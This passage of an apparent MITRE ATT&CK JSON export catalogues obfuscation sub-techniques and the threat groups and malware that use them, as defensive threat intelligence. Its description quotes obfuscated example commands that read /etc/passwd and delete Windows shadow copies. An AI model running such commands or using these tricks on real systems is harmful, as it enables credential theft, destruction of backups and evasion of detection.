                "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.[1][2]For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  ^, +. $, and %) to make commands difficult to analyze while maintaining the same intended functionality.[3] Many languages support built-in obfuscation in the form of base64 or URL encoding.[4] Adversaries may also manually implement command obfuscation via string splitting (\"Wor\"+\"d.Application\"), order and casing of characters (rev <<<'dwssap/cte/ tac'), globing (mkdir -p '/tmp/:&$NiA'), as well as various tricks involving passing strings through tokens/environment variables/input streams.[5][6]Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete).[7]Tools such as Invoke-Obfuscation and Invoke-DOSfucation have also been used to obfuscate commands.[8][9]",
                "Procedure": {
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used Base64 to obfuscate executed commands.[10]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used the Invoke-Obfuscation framework to obfuscate their PowerShell.[11][12][13]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has encoded PowerShell commands in Base64.[14]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has obfuscated and randomized parts of the JScript code it is initiating.[15]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has used compressed and decimal encoded VBS scripts.[16]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> malicious PowerShell commands can be encoded with base64.[17]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "During <name>, the threat actors used Base64 to encode their PowerShell scripts.[18][19]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors used encoded PowerShell commands.[20][21]"
                    },
                    "S0462": {
                        "ID": "S0462",
                        "Name": "CARROTBAT",
                        "Description": "<name> has the ability to execute obfuscated commands on the infected host.[22]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has encoded PowerShell commands.[23]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> obfuscated several scriptlets and code used on the victim\u2019s machine, including through use of XOR and RC4.[24][25]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used encryption and base64 to obfuscate its orchestrator code in the Registry. <name> has also used encoded PowerShell scripts.[26][27]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has used base64 encoding to obfuscate scripts on the system.[28]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has used Base64 to encode PowerShell commands.[29]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> has encoded its PowerShell commands in Base64.[13]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has obfuscated malicious scripts to help avoid detection.[30]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts. [31][32][33][34]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has the ability to obfuscate commands using Invoke-Obfuscation.[35]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used encoded PowerShell commands.[36]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.[6][37][38]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used environment variables and standard input (stdin) to obfuscate command-line arguments. <name> also obfuscates malicious macros delivered as payloads.[6][39][40]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has base64 encoded scripts to avoid detection.[41]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors ran encoded commands from the command line.[42]"
                    },
                    "S0277": {
                        "ID": "S0277",
                        "Name": "FruitFly",
                        "Description": "<name> executes and stores obfuscated Perl scripts.[43]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used obfuscated or encrypted scripts.[44][45]"
                    },
                    "G0115": {
                        "ID": "G0115",
                        "Name": "GOLD SOUTHFIELD",
                        "Description": "<name> has executed base64 encoded PowerShell scripts on compromised hosts.[46]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used Base64-encoded scripts.[47]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> can use Base64 and \"junk\" JavaScript code to obfuscate information.[48]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has obfuscated scripts with the BatchEncryption tool.[49]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.[49]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> obfuscated scripts that were used on victim machines.[50]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> has obfuscated various scripts.[51]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. <name> has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.[52][53]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used base64-encoded commands.[54][55]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used Daniel Bohannon\u2019s Invoke-Obfuscation framework and obfuscated PowerShell scripts.[56][12] The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.[56][57][58][59][60][61][62]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "<name>'s PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables.[63][64]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors executed an encoded VBScript file.[65]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.[66]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has obfuscated a script with Crypto Obfuscator.[67]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has pyminifier to obfuscate scripts.[68]"
                    },
                    "S0685": {
                        "ID": "S0685",
                        "Name": "PowerPunch",
                        "Description": "<name> can use Base64-encoded scripts.[45]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of ScriptModification modules that compress and encode scripts and payloads.[69][70]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. <name>'s backdoor code is a multi-layer obfuscated, encoded, and compressed blob. [57][71] <name> has used PowerShell code with custom string obfuscation [72]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use obfuscated and encoded scripts.[73][74]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> was likely obfuscated using Invoke-Obfuscation.[75][12]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "The PowerShell script with the <name> payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.[76][12]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.[77]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> PowerShell scripts can be encrypted with RC4 and compressed using Gzip.[78]"
                    },
                    "S0450": {
                        "ID": "S0450",
                        "Name": "SHARPSTATS",
                        "Description": "<name> has used base64 encoding and XOR to obfuscate PowerShell scripts.[72]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has obfuscated scripts used in execution.[79]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used base64 encoding for scripts.[80][81]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used environment variable string substitution for obfuscation.[82]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.[83]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used base64 encoded PowerShell commands.[84][85]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used obfuscated variable names in a JavaScript configuration file.[86]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.[87]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> droppers execute base64 encoded PowerShell commands.[88]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> used Base64 encoding to obfuscate an Empire service and PowerShell commands.[89][90]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> obfuscates the macro commands in its initial payload.[91]"
                    }
                }
            },
            "011": {
                "name": "Fileless Storage",
                "href": "/techniques/T1027/011",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.[1][2]Similar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., %SystemRoot%\\System32\\Wbem\\Repository) or Registry (e.g., %SystemRoot%\\System32\\Config) physical files.[1]",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s backdoor has stored its configuration in a registry key.[3]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "Some versions of <name> stored its instructions (otherwise in a instructions.ini file) in the Registry.[4]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> may store RC4 encrypted configuration information in the Windows Registry.[5]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has stored encrypted orchestrator code and payloads in the Registry.[6][7]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can store configuration strings, keylogger, and output of components in the Registry.[8]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "<name> stores the backdoor's configuration in the Registry in XML format.[9]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can store its components in the Registry.[10]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can store its configuration in the Registry at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM.[11]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> stores configuration values under the Registry key HKCU\\Software\\Microsoft[dllname].[12]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can store its configuration information in the Registry under HKCU:\\Software\\Netwire.[13]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.[14]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> has stored a compressed payload in the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM.[15]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> has stored its encrypted payload in the Registry under HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\.[16]"
                    },
                    "S0518": {
                        "ID": "S0518",
                        "Name": "PolyglotDuke",
                        "Description": "<name> can store encrypted JSON configuration files in the Registry.[17]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.[18][19]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as HKCU\\Office365DCOMCheck) in the HKCU hive.[20]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can store its obfuscated configuration file in the Registry under HKLM\\SOFTWARE\\Plus or HKCU\\SOFTWARE\\Plus.[21][22]"
                    },
                    "S0511": {
                        "ID": "S0511",
                        "Name": "RegDuke",
                        "Description": "<name> can store its encryption key in the Registry.[17]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can save encryption parameters and system information in the Registry.[23][24][25][26][27]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> maintains a configuration block and virtual file system in the Registry.[28][29]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has installed a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot registry key.[30]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can store its encoded configuration file within Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.[31]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> can save its configuration data as a RC4-encrypted Registry key under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.[32]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> can save its configuration parameters in the Registry.[33]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used the Registry to store encrypted and encoded payloads.[34][35]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> can install and store encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[36]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds.[37]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has the ability to store information regarding the C2 server and downloads in the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64.[38][39][40]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "<name> stores an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.[41][42]"
                    }
                }
            },
            "012": {
                "name": "LNK Icon Smuggling",
                "href": "/techniques/T1027/012",
                "description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the IconEnvironmentDataBlock) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.[1][2]LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
                "Procedure": {}
            },
            "013": {
                "name": "Encrypted/Encoded File",
                "href": "/techniques/T1027/013",
                "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.[1] Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution).[2] Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
                "Procedure": {
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> obfuscates strings in the payload.[3]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used Base64 to obfuscate payloads.[4]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> encrypted a .dll payload using RTL and a custom encryption algorithm. <name> has also obfuscated payloads with base64, XOR, and RC4.[5][6][7][8][9]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has performed code obfuscation, including encoding payloads using Base64 and using a framework called \"Dont-Kill-My-Cat (DKMC). <name> also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.[10][11][12][13][14][15][16]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used base64 to encode payloads.[17]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used malware to drop encrypted CAB files.[18]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has used an encrypted configuration file for its loader.[19]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has used an XOR-based algorithm to encrypt payloads twice with different keys.[20]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "Strings in <name>'s components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.[21]"
                    },
                    "S0347": {
                        "ID": "S0347",
                        "Name": "AuditCred",
                        "Description": "<name> encrypts the configuration.[22]"
                    },
                    "S0473": {
                        "ID": "S0473",
                        "Name": "Avenger",
                        "Description": "<name> has the ability to XOR encrypt files to be sent to C2.[23]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can be compressed with the ApLib algorithm.[24]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has used XOR, RSA2, and RC4 encrypted files.[25][26][27]"
                    },
                    "S0574": {
                        "ID": "S0574",
                        "Name": "BendyBear",
                        "Description": "<name> has encrypted payloads using RC4 and XOR.[28]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name>'s DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.[29][30]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.[31]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has used a RAR SFX dropper to deliver malware.[32]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has obfuscated code using Base64 encoding.[33]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has obfuscated the wallet address in the payload binary.[34]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> has a XOR-encoded payload.[35]"
                    },
                    "S0415": {
                        "ID": "S0415",
                        "Name": "BOOSTWRITE",
                        "Description": "<name> has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.[36]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has used XOR-based encryption to mask C2 server locations within the trojan.[37]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> encodes many of its artifacts and is encrypted (AES-128) when downloaded.[38]"
                    },
                    "S0462": {
                        "ID": "S0462",
                        "Name": "CARROTBAT",
                        "Description": "<name> has the ability to download a base64 encoded payload.[39]"
                    },
                    "S1041": {
                        "ID": "S1041",
                        "Name": "Chinoxy",
                        "Description": "<name> has encrypted its configuration file.[40]"
                    },
                    "S0667": {
                        "ID": "S0667",
                        "Name": "Chrommme",
                        "Description": "<name> can encrypt sections of its code to evade detection.[41]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "The payload of <name> is encrypted with simple XOR with a rotating key. The <name> configuration file has been encrypted with RC4 keys.[42]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure dsls binary.[43]"
                    },
                    "S0497": {
                        "ID": "S0497",
                        "Name": "Dacls",
                        "Description": "<name> can encrypt its configuration file with AES CBC.[44]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can Base64 encode its payload.[45]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> has obfuscated strings in Bandook by base64 encoding, and then encrypting them.[46]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> drops an encrypted PE file, pe.bin, and decrypts it during installation.[47] <name> also uses custom base64 encoding schemas in later variations to obfuscate payloads.[48]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has obfuscated code using RC4, XOR, and RSA.[49][50]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has been delivered as compressed RAR payloads in ZIP files to victims.[51]"
                    },
                    "S1033": {
                        "ID": "S1033",
                        "Name": "DCSrv",
                        "Description": "<name>'s configuration is encrypted.[52]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "<name> has encrypted its payload.[53]"
                    },
                    "S0213": {
                        "ID": "S0213",
                        "Name": "DOGCALL",
                        "Description": "<name> is encrypted using single-byte XOR.[54]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has encrypted documents and malicious executables.[55]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> encrypts several of its files, including configuration files.[56]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "Variants of <name> encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.[57][58]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> can Base64 encode payloads.[59]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> uses RC4 for encrypting the configuration.[60][61]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> encrypts strings in the backdoor using a custom XOR algorithm.[62][63]"
                    },
                    "S0618": {
                        "ID": "S0618",
                        "Name": "FIVEHANDS",
                        "Description": "The <name> payload is encrypted with AES-128.[64][65][66]"
                    },
                    "S0383": {
                        "ID": "S0383",
                        "Name": "FlawedGrace",
                        "Description": "<name> encrypts its C2 configuration files with AES in CBC mode.[67]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> has been XOR-encoded.[68]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has base64 encoded payloads to avoid detection.[69]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can Base64 encode its C2 address stored in a template binary with the xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_- orxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_= character sets.[40]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has been encrypted using XOR and RC4.[70]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.[71]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has the ability to compress its components.[41]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name>'s uninstaller has base64-encoded its variables. [72]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has written AES-encrypted and Base64-encoded configuration files to disk.[73][74]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "The <name> payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.[20][75][75]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> supports file encryption (AES with the key \"lolomycin2017\").[76]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> encrypts its configuration files with AES-256 and also encrypts its strings.[63]"
                    },
                    "G0043": {
                        "ID": "G0043",
                        "Name": "Group5",
                        "Description": "<name> disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[77]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has encrypted the payload with an XOR-based algorithm.[78]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "The <name> config file is encrypted with RC4.[79]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.[80][81][82]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has the ability to encrypt PE files with a reverse XOR loop.[83]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> can encrypt its payload.[84]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> uses various XOR techniques to obfuscate its components.[85]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> encrypts its configuration and payload.[86]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used Base64 encoded compressed payloads.[87][88]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has encrypted an ELF file.[89]"
                    },
                    "S0232": {
                        "ID": "S0232",
                        "Name": "HOMEFRY",
